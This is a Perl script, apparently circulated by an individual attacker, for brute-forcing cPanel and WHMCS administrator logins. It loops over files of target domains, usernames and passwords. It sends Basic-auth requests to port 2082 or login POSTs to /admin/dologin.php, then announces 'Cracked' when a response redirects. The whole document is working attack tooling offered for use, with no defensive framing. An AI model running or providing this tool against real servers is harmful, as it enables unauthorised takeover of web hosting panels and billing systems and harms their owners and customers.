#!/usr/bin/perl
#
#facebook: https://www.facebook.com/nov3222
#Brute WHM + Cpanals



use Net::FTP;
use LWP::UserAgent;
use WWW::Mechanize;
use MIME::Base64;
if(@ARGV != 5)
{
	die(&useage."\n");
}

$option = lc($ARGV[0]);
$domainsListFile = $ARGV[1];
$usrListFile = $ARGV[2];
$passListFile = $ARGV[3];
$prxyListFile = $ARGV[4];

####Load Files###
#get all users
$/ = "\n";
open(FP,"$usrListFile") || die("sry i can't open $usrListFile file.\n");
@usrList = <FP>;
chomp(@usrList);
close(FP); 
#get all passwords
open(FP,"$passListFile") || die("sry i can't open $passListFile file.\n");
@passList = <FP>;
chomp(@passList);
close(FP); 
#get all proxies
open(FP,"$prxyListFile") || die("sry i can't open $prxyListFile file.\n");
@prxyList = <FP>;
chomp(@prxyList);
close(FP);
#get all domains
open(FP,"$domainsListFile") || die("sry i can't open $domainsListFile file.\n");
@domainsList = <FP>;
chomp(@domainsList);
close(FP);

####End OF Load Files###	

&check_option();


#&check_option;


sub useage
{
	print   "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n".
            "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n".
	        "useage : perl nova.pl option domainslist userlist passlist proxylist\n".
			"EX :perl brute.pl -wp targest.txt users.text passes.text proxies.text\n".
            "-----------------------------------------------------------------\n".
            "-----------------------------------------------------------------\n".
			"Options  \n".
			"\tWHMCS [-whm]\n".
			"\tCpanel [-cp]\n";
}

sub check_option
{
	if($option eq "-whm")
	{
		&brute_whmcs();
	}elsif($option eq "-cp")
	{
		&brute_cpanel();

	}else
	{
		die(&useage."\n");
	}


}



sub brute_cpanel
{
	foreach $domain(@domainsList)
	{
		#get host ip
		$domain =~ s/^http:\/\///;
		$ip = gethostbyname($domain);
		$proto = getprotobyname("tcp");
		$port = 2082;
		$packAddr = pack("Sna4x8",2,$port,$ip);
		$counter = 0 ;
		#load all usernames    
		foreach $user(@usrList)
		{
			#load all passworsd
			foreach $pass(@passList)
			{
	
				$data = encode_base64("$user:$pass");
				$header = "GET / HTTP/1.1\n" .
					  "Authorization: Basic $data\n".
					  "Connection: Close\n\n";
				socket(TCP_SOCK,2,1,$proto);
				connect(TCP_SOCK,$packAddr);
				send(TCP_SOCK,"$header", 0);
				recv(TCP_SOCK,$result,20,0);
				if($result =~ /301/)
				{
				    print "hahaha Cracked ;)) > \n";
				    goto(EXT);
				}
	
			}
		}
		
		EXT : print "Finished.\n";
			
		
	}
	

}


sub brute_whmcs
{
	foreach $domain(@domainsList)
	{

		$domain =~ s/^http:\/\///;	
		$ip = gethostbyname($domain);
		$proto = getprotobyname("tcp");
		$port = 80;
		$packAddr = pack("Sna4x8",2,$port,$ip);
		foreach $user(@usrList)
		{
			#load all passworsd
			foreach $pass(@passList)
			{
				syswrite STDOUT,"Check $user:$pass\n";
				$data = "username=$user&password=$pass&language=";
				$dataLen = length($data);
				$header = "POST /admin/dologin.php HTTP/1.1\r\n".
				"Host: $domain\r\n".
				"User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0\r\n".
				"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n".
				"Referer: http://$domain/admin/login.php\r\n".
				"Content-Type: application/x-www-form-urlencoded\r\n".
				"Content-Length: $dataLen\r\n\r\n".
				"$data\r\n";
				#"Connection: close\r\n\r\n";
				socket(TCP_SOCK,2,1,$proto);
				#bind(TCP_SOCK,$packCAddr) || die ("cant bind $!\n");
				connect(TCP_SOCK,$packAddr);
				send(TCP_SOCK,"$header", 0);
				recv(TCP_SOCK,$result,10240,0);
				
				print $result;
				if($result =~ /Location: index\.php/)
				{
				    print "hahaha Cracked ;)) > \n";
				    goto(EXT);
				}elsif($result =~ /Location: http:\/\/demo\.whmcs\.com\/banned\.php\//)
				
				{
				    print "Ip Banned .\n";
				}
			}
		}
		
		EXT : print "Finished.\n";

	}
	


}